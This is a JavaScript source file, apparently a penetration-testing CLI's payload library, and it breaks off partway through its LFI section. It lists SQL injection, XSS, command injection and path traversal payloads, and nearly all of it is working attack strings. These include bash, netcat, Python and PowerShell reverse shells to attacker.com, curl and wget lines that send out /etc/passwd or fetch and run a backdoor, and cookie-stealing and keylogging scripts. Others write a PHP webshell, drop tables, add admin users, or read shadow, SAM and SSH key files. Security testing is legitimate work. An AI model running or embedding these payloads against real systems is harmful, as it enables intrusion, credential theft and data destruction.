"use strict";

// ---------------------------------------------------------------------------
// Darknode CLI -- Comprehensive Payload Library
// ---------------------------------------------------------------------------
// Curated collection of penetration-testing payloads for security assessment.
// Every payload uses placeholder domains (evil.com, attacker.com, target.com)
// and contains no real credentials or tokens.
//
// Each entry:
//   cat      - category name
//   name     - short descriptive name
//   payload  - the raw payload string
//   desc     - what the payload does / tests
//   risk     - info | low | medium | high | critical
// ---------------------------------------------------------------------------

const PAYLOAD_LIBRARY = [

  // =======================================================================
  //  1. SQLi  (55 payloads)
  // =======================================================================

  // -- Union-based SQLi --
  {
    cat: "SQLi",
    name: "union-basic-columns",
    payload: "' UNION SELECT NULL,NULL,NULL--",
    desc: "Determine number of columns via UNION NULL injection",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "union-extract-version-mysql",
    payload: "' UNION SELECT 1,@@version,3--",
    desc: "Extract MySQL version through UNION injection",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "union-extract-tables",
    payload: "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    desc: "Enumerate table names from information_schema",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "union-extract-columns",
    payload: "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
    desc: "Extract column names from the users table",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "union-extract-credentials",
    payload: "' UNION SELECT 1,username,password FROM users--",
    desc: "Attempt to dump usernames and passwords via UNION",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "union-concat-mysql",
    payload: "' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users--",
    desc: "Concatenate username:password pairs using MySQL CONCAT",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "union-group-concat",
    payload: "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    desc: "List all tables in current database via GROUP_CONCAT",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "union-string-based",
    payload: "' UNION SELECT 'a',NULL,NULL--",
    desc: "Test for string-compatible column in UNION query",
    risk: "medium",
  },

  // -- Blind SQLi --
  {
    cat: "SQLi",
    name: "blind-boolean-true",
    payload: "' AND 1=1--",
    desc: "Boolean-based blind injection true condition",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "blind-boolean-false",
    payload: "' AND 1=2--",
    desc: "Boolean-based blind injection false condition",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "blind-substring-check",
    payload: "' AND SUBSTRING(@@version,1,1)='5'--",
    desc: "Extract database version character by character",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "blind-ascii-extraction",
    payload: "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    desc: "Binary search extraction of password via ASCII comparison",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "blind-conditional-error",
    payload: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
    desc: "Error-based blind injection using conditional division by zero",
    risk: "high",
  },

  // -- Time-based blind SQLi --
  {
    cat: "SQLi",
    name: "time-based-mysql",
    payload: "' AND SLEEP(5)--",
    desc: "MySQL time-based blind injection with 5-second delay",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "time-based-mssql",
    payload: "'; WAITFOR DELAY '0:0:5'--",
    desc: "MSSQL time-based blind injection with WAITFOR",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "time-based-postgres",
    payload: "'; SELECT pg_sleep(5)--",
    desc: "PostgreSQL time-based blind injection with pg_sleep",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "time-based-oracle",
    payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    desc: "Oracle time-based blind injection using DBMS_PIPE",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "time-based-conditional-mysql",
    payload: "' AND IF(1=1,SLEEP(5),0)--",
    desc: "Conditional time-based extraction for MySQL",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "time-based-benchmark",
    payload: "' AND BENCHMARK(10000000,SHA1('test'))--",
    desc: "MySQL time delay via BENCHMARK function",
    risk: "high",
  },

  // -- Error-based SQLi --
  {
    cat: "SQLi",
    name: "error-based-extractvalue",
    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    desc: "MySQL error-based extraction using EXTRACTVALUE",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "error-based-updatexml",
    payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    desc: "MySQL error-based extraction using UPDATEXML",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "error-based-double-query",
    payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    desc: "MySQL double-query error-based injection",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "error-based-mssql-convert",
    payload: "' AND 1=CONVERT(int,(SELECT @@version))--",
    desc: "MSSQL error-based injection via CONVERT type mismatch",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "error-based-postgres-cast",
    payload: "' AND 1=CAST((SELECT version()) AS int)--",
    desc: "PostgreSQL error-based injection via CAST type mismatch",
    risk: "high",
  },

  // -- Stacked queries --
  {
    cat: "SQLi",
    name: "stacked-insert-user",
    payload: "'; INSERT INTO users(username,password) VALUES('attacker','pass123')--",
    desc: "Insert a new user via stacked query injection",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "stacked-update-password",
    payload: "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    desc: "Modify admin password via stacked query",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "stacked-drop-table",
    payload: "'; DROP TABLE users--",
    desc: "Destructive stacked query to drop a table",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "stacked-xp-cmdshell",
    payload: "'; EXEC xp_cmdshell('whoami')--",
    desc: "MSSQL command execution via xp_cmdshell",
    risk: "critical",
  },

  // -- Authentication bypass --
  {
    cat: "SQLi",
    name: "auth-bypass-or-true",
    payload: "' OR '1'='1",
    desc: "Classic authentication bypass with OR true condition",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "auth-bypass-comment",
    payload: "admin'--",
    desc: "Bypass password check by commenting out remainder of query",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "auth-bypass-double-quote",
    payload: "\" OR \"\"=\"",
    desc: "Authentication bypass using double-quoted string comparison",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "auth-bypass-or-1-limit",
    payload: "' OR 1=1 LIMIT 1--",
    desc: "Auth bypass returning only the first row to avoid errors",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "auth-bypass-union-admin",
    payload: "' UNION SELECT 1,'admin','anything' FROM dual--",
    desc: "Auth bypass via UNION to inject admin credentials",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "auth-bypass-hash-comment",
    payload: "admin'#",
    desc: "MySQL auth bypass using hash comment",
    risk: "critical",
  },

  // -- WAF bypass SQLi --
  {
    cat: "SQLi",
    name: "waf-bypass-inline-comment",
    payload: "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
    desc: "WAF bypass using MySQL inline comments around keywords",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "waf-bypass-case-variation",
    payload: "' uNiOn SeLeCt 1,2,3--",
    desc: "WAF bypass via mixed-case SQL keywords",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "waf-bypass-double-encoding",
    payload: "%2527%2520OR%25201%253D1--",
    desc: "WAF bypass using double URL encoding",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "waf-bypass-concat-keywords",
    payload: "' UNION%0ASELECT%0A1,2,3--",
    desc: "WAF bypass using newline characters between SQL keywords",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "waf-bypass-null-byte",
    payload: "%00' UNION SELECT 1,2,3--",
    desc: "WAF bypass with null byte prefix",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "waf-bypass-tab-whitespace",
    payload: "'\tUNION\tSELECT\t1,2,3--",
    desc: "WAF bypass using tab characters as whitespace",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "waf-bypass-scientific-notation",
    payload: "' UNION SELECT 1e0,2e0,3e0--",
    desc: "WAF bypass using scientific notation for numeric values",
    risk: "high",
  },

  // -- Database-specific SQLi --
  {
    cat: "SQLi",
    name: "sqlite-version",
    payload: "' UNION SELECT sqlite_version(),NULL--",
    desc: "Extract SQLite version through UNION",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "sqlite-table-enum",
    payload: "' UNION SELECT name,sql FROM sqlite_master--",
    desc: "Enumerate SQLite tables and schema",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "oracle-all-tables",
    payload: "' UNION SELECT table_name,NULL FROM all_tables--",
    desc: "Enumerate Oracle database tables",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "oracle-utl-http",
    payload: "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)),NULL FROM dual--",
    desc: "Oracle out-of-band data exfiltration via UTL_HTTP",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "postgres-copy-to",
    payload: "'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'||version()'--",
    desc: "PostgreSQL out-of-band exfiltration via COPY TO PROGRAM",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "mssql-openrowset",
    payload: "' UNION SELECT 1,2,3 FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pass','SELECT 1')--",
    desc: "MSSQL out-of-band connection via OPENROWSET",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "mysql-load-file",
    payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
    desc: "MySQL file read via LOAD_FILE function",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "mysql-into-outfile",
    payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]);?>',NULL INTO OUTFILE '/var/www/html/shell.php'--",
    desc: "MySQL webshell write via INTO OUTFILE",
    risk: "critical",
  },
  {
    cat: "SQLi",
    name: "mssql-linked-server",
    payload: "'; EXEC sp_linkedservers--",
    desc: "MSSQL linked server enumeration",
    risk: "high",
  },
  {
    cat: "SQLi",
    name: "postgres-large-object",
    payload: "'; SELECT lo_import('/etc/passwd')--",
    desc: "PostgreSQL file read via large object import",
    risk: "critical",
  },

  // =======================================================================
  //  2. XSS  (55 payloads)
  // =======================================================================

  // -- Reflected XSS --
  {
    cat: "XSS",
    name: "reflected-basic-script",
    payload: "<script>alert('XSS')</script>",
    desc: "Basic reflected XSS via script tag",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "reflected-img-onerror",
    payload: "<img src=x onerror=alert('XSS')>",
    desc: "XSS via img tag onerror event handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "reflected-svg-onload",
    payload: "<svg onload=alert('XSS')>",
    desc: "XSS via SVG onload event handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "reflected-body-onload",
    payload: "<body onload=alert('XSS')>",
    desc: "XSS via body tag onload handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "reflected-input-autofocus",
    payload: "<input autofocus onfocus=alert('XSS')>",
    desc: "XSS via autofocus and onfocus on input element",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "reflected-details-toggle",
    payload: "<details open ontoggle=alert('XSS')>",
    desc: "XSS via details element ontoggle event",
    risk: "medium",
  },

  // -- Stored XSS --
  {
    cat: "XSS",
    name: "stored-script-cookie",
    payload: "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    desc: "Stored XSS to exfiltrate cookies to attacker server",
    risk: "high",
  },
  {
    cat: "XSS",
    name: "stored-fetch-exfil",
    payload: "<script>fetch('http://attacker.com/steal?d='+document.cookie)</script>",
    desc: "Stored XSS using fetch API for cookie exfiltration",
    risk: "high",
  },
  {
    cat: "XSS",
    name: "stored-keylogger",
    payload: "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>",
    desc: "Stored XSS keylogger sending keypresses to attacker",
    risk: "critical",
  },
  {
    cat: "XSS",
    name: "stored-iframe-phish",
    payload: "<iframe src='http://attacker.com/phish.html' style='position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999'>",
    desc: "Stored XSS creating fullscreen phishing iframe overlay",
    risk: "high",
  },

  // -- DOM-based XSS --
  {
    cat: "XSS",
    name: "dom-hash-injection",
    payload: "#<img src=x onerror=alert('XSS')>",
    desc: "DOM XSS via document.location.hash injection",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "dom-innerhtml-sink",
    payload: "<img src=x onerror=alert(document.domain)>",
    desc: "DOM XSS targeting innerHTML sink with domain disclosure",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "dom-document-write",
    payload: "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    desc: "DOM XSS via document.write injection",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "dom-eval-injection",
    payload: "'-alert('XSS')-'",
    desc: "DOM XSS targeting eval or similar dynamic code execution",
    risk: "medium",
  },

  // -- Filter bypass XSS --
  {
    cat: "XSS",
    name: "bypass-no-script-tag",
    payload: "<img/src=x onerror=alert('XSS')>",
    desc: "Bypass script tag filter using img with slash syntax",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-case-sensitive",
    payload: "<ScRiPt>alert('XSS')</ScRiPt>",
    desc: "Bypass case-sensitive script tag filter",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-double-encoding",
    payload: "%253Cscript%253Ealert('XSS')%253C/script%253E",
    desc: "Bypass filter via double URL encoding of angle brackets",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-null-byte",
    payload: "<scr%00ipt>alert('XSS')</scr%00ipt>",
    desc: "Bypass filter using null byte injection in tag name",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-html-entities",
    payload: "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    desc: "Bypass filter using HTML numeric character references",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-backtick-alert",
    payload: "<script>alert`XSS`</script>",
    desc: "Bypass parenthesis filter using template literal backticks",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-constructor",
    payload: "<script>[].constructor.constructor('alert(1)')()</script>",
    desc: "Bypass alert filter using Function constructor",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-atob-decode",
    payload: "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
    desc: "Bypass keyword filter using base64 encoded payload",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-unicode-escape",
    payload: "<script>\\u0061lert('XSS')</script>",
    desc: "Bypass filter using JavaScript Unicode escape sequences",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-string-concat",
    payload: "<script>window['al'+'ert']('XSS')</script>",
    desc: "Bypass alert filter using string concatenation property access",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-settimeout",
    payload: "<script>setTimeout('ale'+'rt(1)',0)</script>",
    desc: "Bypass filter using setTimeout with string argument",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "bypass-onerror-throw",
    payload: "<script>onerror=alert;throw 'XSS'</script>",
    desc: "Bypass using window.onerror handler with throw statement",
    risk: "medium",
  },

  // -- Event handler XSS --
  {
    cat: "XSS",
    name: "event-onmouseover",
    payload: "<a onmouseover=alert('XSS')>hover me</a>",
    desc: "XSS via onmouseover event handler on anchor tag",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "event-onanimationend",
    payload: "<style>@keyframes x{}</style><div style=animation-name:x onanimationend=alert('XSS')>",
    desc: "XSS via CSS animation end event handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "event-onpointerover",
    payload: "<div onpointerover=alert('XSS')>touch me</div>",
    desc: "XSS via pointer event handler for touch/mouse",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "event-onresize",
    payload: "<body onresize=alert('XSS')><iframe src=javascript:resizeTo(1,1)>",
    desc: "XSS via body onresize triggered by iframe",
    risk: "medium",
  },

  // -- SVG / MathML / exotic tags --
  {
    cat: "XSS",
    name: "svg-animate",
    payload: "<svg><animate onbegin=alert('XSS') attributeName=x>",
    desc: "XSS via SVG animate element onbegin handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "svg-set-handler",
    payload: "<svg><set onbegin=alert('XSS') attributeName=x>",
    desc: "XSS via SVG set element onbegin handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "svg-foreignobject",
    payload: "<svg><foreignObject><body onload=alert('XSS')></foreignObject></svg>",
    desc: "XSS via SVG foreignObject embedding HTML content",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "mathml-xlink",
    payload: "<math><maction actiontype='statusline#' xlink:href='javascript:alert(1)'>click</maction></math>",
    desc: "XSS via MathML element with xlink href",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "svg-use-xlink",
    payload: "<svg><use xlink:href='data:image/svg+xml,<svg onload=alert(1)>'/>",
    desc: "XSS via SVG use element with data URI",
    risk: "medium",
  },

  // -- Polyglot XSS --
  {
    cat: "XSS",
    name: "polyglot-multi-context",
    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/oNcliCk=alert()//",
    desc: "Multi-context XSS polyglot for various injection points",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "polyglot-universal",
    payload: "'\"><img src=x onerror=alert('XSS')>",
    desc: "Universal polyglot breaking out of attribute and tag context",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "polyglot-attribute-tag",
    payload: "' onfocus=alert(1) autofocus='",
    desc: "Polyglot for attribute injection context with autofocus",
    risk: "medium",
  },

  // -- CSP bypass XSS --
  {
    cat: "XSS",
    name: "csp-bypass-jsonp",
    payload: "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
    desc: "CSP bypass via JSONP endpoint on whitelisted domain",
    risk: "high",
  },
  {
    cat: "XSS",
    name: "csp-bypass-base-tag",
    payload: "<base href='http://attacker.com/'><script src='/legit.js'></script>",
    desc: "CSP bypass using base tag to redirect relative script sources",
    risk: "high",
  },
  {
    cat: "XSS",
    name: "csp-bypass-meta-redirect",
    payload: "<meta http-equiv='refresh' content='0;url=http://attacker.com/steal?c='+document.cookie>",
    desc: "CSP bypass using meta refresh to exfiltrate data",
    risk: "high",
  },
  {
    cat: "XSS",
    name: "csp-bypass-object-data",
    payload: "<object data='data:text/html,<script>alert(1)</script>'>",
    desc: "CSP bypass using object element with data URI",
    risk: "high",
  },
  {
    cat: "XSS",
    name: "csp-bypass-nonce-reuse",
    payload: "<script nonce='REUSED_NONCE'>alert('XSS')</script>",
    desc: "CSP bypass exploiting reused or predictable nonce values",
    risk: "high",
  },

  // -- Additional XSS vectors --
  {
    cat: "XSS",
    name: "xss-marquee-onstart",
    payload: "<marquee onstart=alert('XSS')>",
    desc: "XSS via deprecated marquee element onstart handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-video-source",
    payload: "<video><source onerror=alert('XSS')>",
    desc: "XSS via video source element error handler",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-object-onerror",
    payload: "<object onerror=alert('XSS') data='invalid:'>",
    desc: "XSS via object element onerror with invalid data",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-embed-src",
    payload: "<embed src='javascript:alert(1)'>",
    desc: "XSS via embed element with javascript URI",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-isindex-action",
    payload: "<form><button formaction=javascript:alert('XSS')>click</button></form>",
    desc: "XSS via form button formaction with javascript URI",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-iframe-srcdoc",
    payload: "<iframe srcdoc='<script>alert(1)</script>'>",
    desc: "XSS via iframe srcdoc attribute with embedded script",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-meta-refresh-js",
    payload: "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    desc: "XSS via meta refresh redirecting to javascript URI",
    risk: "medium",
  },
  {
    cat: "XSS",
    name: "xss-style-expression",
    payload: "<div style=\"background:url('javascript:alert(1)');\">",
    desc: "XSS via CSS background URL with javascript URI (legacy IE)",
    risk: "low",
  },

  // =======================================================================
  //  3. Command Injection  (35 payloads)
  // =======================================================================

  // -- Linux command injection --
  {
    cat: "Command Injection",
    name: "cmd-semicolon",
    payload: "; id",
    desc: "Basic command injection using semicolon separator",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-pipe",
    payload: "| id",
    desc: "Command injection via pipe to execute id command",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-backticks",
    payload: "`id`",
    desc: "Command injection using backtick command substitution",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-dollar-paren",
    payload: "$(id)",
    desc: "Command injection via dollar-parenthesis substitution",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-and-chain",
    payload: "&& id",
    desc: "Command injection using AND operator chaining",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-or-chain",
    payload: "|| id",
    desc: "Command injection using OR operator chaining",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-newline",
    payload: "%0aid",
    desc: "Command injection using URL-encoded newline separator",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-reverse-shell-bash",
    payload: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    desc: "Linux bash reverse shell via TCP redirect",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-reverse-shell-nc",
    payload: "; nc -e /bin/sh attacker.com 4444",
    desc: "Linux reverse shell via netcat with -e flag",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-reverse-shell-python",
    payload: "; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    desc: "Linux reverse shell via Python3 subprocess",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-curl-exfil",
    payload: "; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)",
    desc: "Exfiltrate /etc/passwd via curl to attacker server",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-wget-download",
    payload: "; wget http://attacker.com/backdoor.sh -O /tmp/bd.sh && chmod +x /tmp/bd.sh && /tmp/bd.sh",
    desc: "Download and execute backdoor script via wget",
    risk: "critical",
  },

  // -- Windows command injection --
  {
    cat: "Command Injection",
    name: "cmd-win-whoami",
    payload: "& whoami",
    desc: "Windows command injection to identify current user",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-win-dir",
    payload: "| dir C:\\",
    desc: "Windows command injection to list C: drive contents",
    risk: "high",
  },
  {
    cat: "Command Injection",
    name: "cmd-win-type",
    payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    desc: "Windows file read via type command injection",
    risk: "high",
  },
  {
    cat: "Command Injection",
    name: "cmd-win-powershell-rev",
    payload: "& powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('attacker.com',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}\"",
    desc: "Windows PowerShell reverse shell via TCP socket",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-win-certutil-download",
    payload: "& certutil -urlcache -split -f http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe",
    desc: "Windows file download via certutil living-off-the-land",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-win-net-user",
    payload: "& net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add",
    desc: "Windows create admin user via net user command chain",
    risk: "critical",
  },

  // -- Blind command injection --
  {
    cat: "Command Injection",
    name: "cmd-blind-sleep",
    payload: "; sleep 10",
    desc: "Blind command injection detection via time delay",
    risk: "high",
  },
  {
    cat: "Command Injection",
    name: "cmd-blind-ping",
    payload: "; ping -c 5 attacker.com",
    desc: "Blind command injection detection via ICMP callback",
    risk: "high",
  },
  {
    cat: "Command Injection",
    name: "cmd-blind-dns-exfil",
    payload: "; nslookup $(whoami).attacker.com",
    desc: "Blind command injection with DNS exfiltration of whoami output",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-blind-curl-oob",
    payload: "; curl http://attacker.com/$(hostname)",
    desc: "Blind command injection with out-of-band HTTP exfiltration",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-blind-win-ping",
    payload: "& ping -n 10 127.0.0.1",
    desc: "Windows blind command injection detection via ping delay",
    risk: "high",
  },
  {
    cat: "Command Injection",
    name: "cmd-blind-win-nslookup",
    payload: "& nslookup %USERNAME%.attacker.com",
    desc: "Windows blind command injection with DNS exfiltration",
    risk: "critical",
  },

  // -- Filter bypass command injection --
  {
    cat: "Command Injection",
    name: "cmd-bypass-space-ifs",
    payload: ";cat${IFS}/etc/passwd",
    desc: "Bypass space filter using IFS (Internal Field Separator)",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-space-brace",
    payload: ";{cat,/etc/passwd}",
    desc: "Bypass space filter using brace expansion",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-space-tab",
    payload: ";\tcat\t/etc/passwd",
    desc: "Bypass space filter using tab characters",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-keyword-quotes",
    payload: ";c'a't /etc/passwd",
    desc: "Bypass command keyword filter using single quote insertion",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-keyword-backslash",
    payload: ";c\\at /etc/passwd",
    desc: "Bypass command keyword filter using backslash insertion",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-keyword-variable",
    payload: ";a=c;b=at;$a$b /etc/passwd",
    desc: "Bypass command filter by splitting command name into variables",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-wildcard",
    payload: ";/bin/ca? /etc/pas?wd",
    desc: "Bypass filter using single-character wildcard in path",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-base64",
    payload: ";echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
    desc: "Bypass filter using base64-encoded command decoded and piped to shell",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-hex-printf",
    payload: ";$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
    desc: "Bypass filter using hex-encoded command via printf",
    risk: "critical",
  },
  {
    cat: "Command Injection",
    name: "cmd-bypass-rev",
    payload: ";echo 'dwssap/cte/ tac' | rev | sh",
    desc: "Bypass filter by reversing the command string",
    risk: "critical",
  },

  // =======================================================================
  //  4. LFI / RFI  (32 payloads)
  // =======================================================================

  // -- Basic path traversal --
  {
    cat: "LFI/RFI",
    name: "lfi-etc-passwd",
    payload: "../../../../etc/passwd",
    desc: "Linux path traversal to read /etc/passwd",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-etc-shadow",
    payload: "../../../../etc/shadow",
    desc: "Linux path traversal to read /etc/shadow (password hashes)",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-windows-hosts",
    payload: "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    desc: "Windows path traversal to read hosts file",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-windows-sam",
    payload: "..\\..\\..\\..\\Windows\\System32\\config\\SAM",
    desc: "Windows path traversal to read SAM password database",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-proc-self-environ",
    payload: "../../../../proc/self/environ",
    desc: "Read process environment variables via proc filesystem",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-proc-self-cmdline",
    payload: "../../../../proc/self/cmdline",
    desc: "Read process command line arguments via proc filesystem",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-ssh-private-key",
    payload: "../../../../home/user/.ssh/id_rsa",
    desc: "Attempt to read SSH private key for user account",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-var-log-auth",
    payload: "../../../../var/log/auth.log",
    desc: "Read Linux authentication log for credential harvesting",
    risk: "high",
  },

  // -- Null byte injection --
  {
    cat: "LFI/RFI",
    name: "lfi-null-byte",
    payload: "../../../../etc/passwd%00",
    desc: "Path traversal with null byte to truncate appended extension",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-null-byte-double",
    payload: "../../../../etc/passwd%2500",
    desc: "Path traversal with double-encoded null byte",
    risk: "high",
  },

  // -- PHP wrapper based LFI --
  {
    cat: "LFI/RFI",
    name: "lfi-php-filter-base64",
    payload: "php://filter/convert.base64-encode/resource=index.php",
    desc: "Read PHP source code via base64 encoding filter wrapper",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-php-filter-rot13",
    payload: "php://filter/read=string.rot13/resource=config.php",
    desc: "Read PHP config file via ROT13 filter to bypass detection",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-php-input",
